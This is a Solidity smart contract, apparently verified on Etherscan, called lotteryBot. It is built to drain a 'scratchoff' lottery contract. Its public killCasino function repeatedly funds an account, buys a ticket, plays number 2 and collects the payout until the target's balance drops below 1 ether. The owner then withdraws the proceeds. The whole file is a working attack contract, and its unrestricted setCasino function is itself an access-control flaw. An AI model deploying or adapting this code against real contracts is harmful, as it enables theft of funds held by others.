/**
 *Submitted for verification at Etherscan.io on 2022-11-20
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract lotteryBot {

    address owner;
    address payable casino;
    bool accountMade;
    scratchoff t;

    constructor(){
        owner = msg.sender;
        accountMade = false;
    }

    receive() external payable{}

    function fundBot() public payable {}

    function setCasino(address _address) public {
        casino = payable(_address);
        t = scratchoff(casino);
    }

    function fundBotAccount() private {
        if(accountMade == false) {
            require(address(this).balance >= 2.005 ether, "not enough in the contract");
            t.fundAccount{value: 2.005 ether}();
            accountMade = true;
        } else {
            require(address(this).balance >= 2 ether, "not enough in the contract");
            t.fundAccount{value: 2 ether}();
        }
    }

    function getTicket() private {
        t.buyTicket();
    }

    function playLottery() private {
        t.play(2);
    }

    function reFinance() private {
        t.takePayout();
    }


    function killCasino() public {
        while(address(casino).balance > 1 ether) {
            fundBotAccount();
            getTicket();
            playLottery();
            reFinance();
        }
    }

    function retrieveFunds() public {
        require(msg.sender == owner, "cannot retrieve funds");
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Not paid");
    }

}

abstract contract scratchoff {
    function buyTicket() public virtual;
    function play(int num) public virtual;
    function takePayout() public virtual;
    function fundAccount() public payable virtual;
    function getFunds() public view virtual;
    function getTickets() public view virtual;
}